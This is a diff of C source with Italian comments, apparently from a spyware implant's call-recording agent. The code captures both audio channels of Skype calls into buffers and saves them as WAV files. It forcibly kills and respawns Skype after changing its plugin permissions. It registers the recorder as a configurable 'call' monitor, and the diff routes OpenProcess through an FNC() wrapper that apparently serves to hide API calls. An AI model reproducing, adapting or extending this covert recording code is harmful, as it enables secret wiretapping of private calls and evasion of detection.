@@ -113,8 +113,8 @@ DWORD sample_sampling[2] = {SAMPLE_RATE_SKYPE_W, SAMPLE_RATE_SKYPE_W}; // Sample
 FILETIME channel_time_start[2];		 // Time stamp di inizio chiamata
 FILETIME channel_time_last[2];       // Time stamp dell'ultimo campione
 BYTE *wave_array[2] = {NULL, NULL};	 // Buffer contenenti i PCM dei due canali
-DWORD max_sample_size; // Dimensione oltre la quale salva un sample su file
-DWORD compress_factor; // Fattore di compressione del codec
+DWORD max_sample_size = 500000; // Dimensione oltre la quale salva un sample su file
+DWORD compress_factor = 5; // Fattore di compressione del codec
 HMODULE codec_handle = NULL; // Handle alla dll del codec
 BOOL bPM_spmcp = FALSE; // Semaforo per l'uscita del thread
 HANDLE hSkypePMThread = NULL;
@@ -1852,7 +1852,9 @@ void EndCall()
 			SaveWav(wave_array[i], sample_size[i], sample_channels[i], additional_data, additional_len);
 			sample_size[i] = 0;
 		}
+	}
 
+	for (i=0; i<2; i++) {
 		// Aggiunge il chunk di fine chiamata
 		// Forza la marcatura temporale alla fine dell'ultimo chunk della chiamata
 		channel_time_start[i].dwHighDateTime = channel_time_last[i].dwHighDateTime;
@@ -2308,7 +2310,7 @@ void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 
 	// Se ne scrive almeno una, killa e respawna skype
 	if (is_to_respawn) {
-		if (hSkype = OpenProcess(PROCESS_TERMINATE, FALSE, skype_pid)) {
+		if (hSkype = FNC(OpenProcess)(PROCESS_TERMINATE, FALSE, skype_pid)) {
 			STARTUPINFO si;
 			PROCESS_INFORMATION pi;
 			HANDLE hToken;
@@ -2849,31 +2851,20 @@ DWORD __stdcall PM_VoipRecordStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_VoipRecordInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_VoipRecordInit(JSONObject elem)
 {
-	DWORD *pdwparam;
 	// Inizializza la dimensione dei sample su disco
 	// e il fattore di compressione
-	if (conf_ptr) {
-		pdwparam = (DWORD *)conf_ptr;
-		max_sample_size = *pdwparam;
-		pdwparam++;
-		compress_factor = *pdwparam;
+	max_sample_size = (DWORD) elem[L"buffer"]->AsNumber();
+	compress_factor = (DWORD) elem[L"compression"]->AsNumber();
 
-		// Riallochiamo l'array per i PCM
-		// Siamo sicuri di non perdere dati, perche' la Init viene fatta sempre dopo lo Stop
-		// Che avra' flushato entrambe le code e in questo momento il thread di dispatch e' ancora fermo
-		SAFE_FREE(wave_array[INPUT_ELEM]);
-		SAFE_FREE(wave_array[OUTPUT_ELEM]);
-		wave_array[INPUT_ELEM]  = (BYTE *)malloc(max_sample_size + MAX_MSG_LEN * 2);
-		wave_array[OUTPUT_ELEM] = (BYTE *)malloc(max_sample_size + MAX_MSG_LEN * 2);
-	} else {
-		// Inizializza di default a DEFAULT_SAMPLE_SIZE
-		max_sample_size = DEFAULT_SAMPLE_SIZE;
-		compress_factor = DEFAULT_COMPRESSION;
-	}
-
-	PM_VoipRecordStartStop(bStartFlag, TRUE);
+	// Riallochiamo l'array per i PCM
+	// Siamo sicuri di non perdere dati, perche' la Init viene fatta sempre dopo lo Stop
+	// Che avra' flushato entrambe le code e in questo momento il thread di dispatch e' ancora fermo
+	SAFE_FREE(wave_array[INPUT_ELEM]);
+	SAFE_FREE(wave_array[OUTPUT_ELEM]);
+	wave_array[INPUT_ELEM]  = (BYTE *)malloc(max_sample_size + MAX_MSG_LEN * 2);
+	wave_array[OUTPUT_ELEM] = (BYTE *)malloc(max_sample_size + MAX_MSG_LEN * 2);
 	return 1;
 }
 
@@ -2901,11 +2892,6 @@ DWORD __stdcall PM_VoipRecordUnregister()
 
 void PM_VoipRecordRegister()
 {
+	AM_MonitorRegister(L"call", PM_VOIPRECORDAGENT, (BYTE *)PM_VoipRecordDispatch, (BYTE *)PM_VoipRecordStartStop, (BYTE *)PM_VoipRecordInit, (BYTE *)PM_VoipRecordUnregister);
 	InitializeCriticalSection(&skype_critic_sec);
-	// L'hook viene registrato dalla funzione HM_InbundleHooks
-	AM_MonitorRegister(PM_VOIPRECORDAGENT, (BYTE *)PM_VoipRecordDispatch, (BYTE *)PM_VoipRecordStartStop, (BYTE *)PM_VoipRecordInit, (BYTE *)PM_VoipRecordUnregister);
-
-	// Inizialmente i monitor devono avere una configurazione di default nel caso
-	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
-	PM_VoipRecordInit(NULL, FALSE);
 }
